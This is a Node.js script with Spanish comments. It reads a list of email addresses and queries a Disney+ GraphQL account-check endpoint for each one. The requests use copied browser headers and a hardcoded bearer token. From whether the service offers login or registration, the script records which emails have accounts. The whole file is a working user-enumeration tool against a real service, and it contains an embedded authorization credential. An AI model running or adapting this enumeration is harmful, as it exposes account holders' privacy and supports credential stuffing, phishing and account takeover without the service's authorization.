import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..RMsKNTFXjfwHYBpW.rUpL1GsvcIRDRaNudtYrU6iCUXXSobYsI_i7JbNtmYLSoRyEe1NeSmZDWayAGRBN1ilkyI9G9fpKy7jE2bE5byf1w03be4YUeAzOMi-VHZWTOGK64HtWubIynl69UBloMJ2ha95fqSxL2-Sudpv3uSegJNghZOPxVVVtBLyx5x5NIvFuguUY10S8M_IhX4lekfV5YmXz14acq28S6vbN9e44sxZ8P3CfG4GabrVPeHtHokzI_TAT3tI0Xj7qw_OmbZnGF6XKZkGSN7EmXs0MioHomQtUNJpuMLRlTUawU8MmjWYqEb9RIDN9zFUN4ozHsQ2RLNR69A7WtPqpeCIIP4BXXbEG4v4-2jbIuJGff1RzF6Twk76SVIB-0wjfVD7lWf45pzxiudYbRlOuwnZjPX08a9kJZ743b7NQHx9up_gISQ1cXQYRShu6rzO4y3jpWKPrvkfG0bOQ-YeVBJosKl9Ix9NHEeVbXe2wur8r2l_uMROL5onXFyd25fhNhT2pUVCSZznt_tM85b66x2jcu-i4eyCgpMGjy3BB4wepIi823VXVApnNrl1M52NG0yVrWk2_fFdGMeoc9fSuDyoWjFGnV1kUvE_9AWFZOJ-m4qzJ85-SLBEpNX7wIf6FGmzOR_PUNJX14L6sUJ9LYRr3JJ-KxmMM253MS4-UdufiMbssGjGuqii3C_dmScivy--c3wPuyJEpuiIFs2HJ-NC2e9HHjXHRYWlGHwvNmiwgIPT-S3LobqvB2PJfxU9HslzT-kuIiHXKyFF8XsguitwfvzrHE2oBFL_m9jPkeWqp2Cc7cnY_VdOYdT_ppwp3jw6i35c6xcwXEKzdYr8wMEOhQUEpST6t-FqGBdKxlu1p80KLDjGjlrQ3fvlAtnso5o9-WNnt5gceudDwIYY2Bil1FsFcNFEaiArxCXobLvICl-SateeC_FdCBGaN1YstJim9V0J8SxR02DsJK1v2J6fesUbba7TOVEjfPsvfF-oxR7-B-ltc-liEzPJUGPR_E4nGTf7lw8hO3QrpFNlEISLkn-9RMavAW0WB-3zI9qOrxZsi-Gvi_UfHFRdOTIATaYBIHFip9qTXzJt4gh8ntCTMZZlNFtOpkfNl9kII98YmYdQUn66xb-U8gjMvWfXUA3nvCrSmCec-N1VEA4s_lF7wIt7VGecKBLOAfNQIlLBEHuVNhVyfok0SLyCLe1zh1OF3VAVF9R1UbtKLP2KUOqEM0UVwK6tMrDBjOe78FYCl7GBYQ4ptq417LEvtY6u0c1hsUjPqe75Gz2DThPB1RM5TFsvmT5v2ai_W-49ZC6nXFmSFoRK_APwxpZDWZy-7PFHk_07H9ezRiQmuen96RDA0SGqWjDKHe_PbtEbYMDceSv7RJ_yEgd4tZyrpLMIITbjKx3735jreLbmStcngRvJ6PO8zhB1QD4oDV3AjLa3DRizp0JtVcIp7LWIKl6RRrM2f_DF5IlbGS6CHy-UlnVikWSvWOdITVh21dXpYp6VU7cWTPJBtVWLU4QeflYNt9GLP0hurVUvztvhunSdgYxxjQUHhkVi-t60S5Mqvrypaq54XbNa1gqcA68a0SptgL6ucMlCxLxN98VkYAUmgQ3O4KjTVGOc9IYW7Fh_EKTwFSLP3uvYPyw4dmGGpBUoZ7IpGTwGE-4MwKqTA9kMe0ABdMrQhs1Moxcjv5AytPNPllTGN5UVaINBwRMsyjG3WF7yRHB2KelkKPwpF-xCGJgUROr5F1oyuzv0i69cR3T1gQ-yexByLmOkHniRdN-FYXE-UxusHdM4vMGZJPr8ux4sncaM8OrYVHOEn6KqFYgIXEq5zkGZzXFPDxHSld6jc8Nsglg7eEoawAMr6I9P7SfYNTVhKv-DAIF7rutLIPjTwNszw6vUiZFtai1X_BaO-KRc1zjh7CZ7_Bi7uBauJ-Z4f7HYFsQXM2FUY3K8vo-IVAKO4EnMbMvFhwu59kxtkBpjZm6AJh2ZJCqQ3GHV6DCMjdPinEFdxbXGyNfHSgtsxykor08VQMG2Ka2fnVfKsENCnKo_YSrvBUJ4b_Af1c06O8C7FQ6zvp8z4WLcNjXvUj4kBK0zyCYKlSq9aPzlvm6O9cUdQCT0Fc1EZssyCL3mKKsUiNQcXKflhILgOAdxTO_gDTDJgHwH9U9kcDfzA3j0zcHNYhHuRvgiGILEXMqOAM2GtQS2nquKRVhy4D9qjwe4tDtrL6zpk9uZrRlowVt3QmHnZh0XCA5ucLsYsnfzFrdIIaM4iDbpEjUZz-x3HpiA4ac_D18lmoVlvO0I517OZuBIO6Z8ahiNFs9PYoOw9X8cmpV83lHwhOVtBt7JfVuGsQd3Ts6Xy_Wvl5IHZvm5yAZNc-VCyw46gL1FKr8SJONZBBTzsvaW40s7wH4Z8D3gm62W5CmsphpQJitSvQfv8lvc3y1lNBbnnQZYz2ybpPB7RLVsBBc9-7FInO_Er4V0hZUfwJOi5Eu0S6KzY-3BVuH7JORpFSOCbJXsL1uZ1em6pdhwp2OQKx1VTO3dZlSrkpozmgRG16elU9cIl6Cr6BlR45Bgv2-dpuYpyCzuLXm7eYoi2XVPH9sRIzH9DNTdRg-ST6hRE.IGKcqvbollskrXF6Nbkz-w"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];
    
    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if(result.noError){
        if(result.exist===true){
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if(result.exist===false){
            console.log((i+1) + " no existe")
        }
    }

    if(result.noError===false){
        if(result.serverError){
            console.error("🖥🖥🖥🖥 Error servidor: "+result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: "+result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if(result.exist===null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}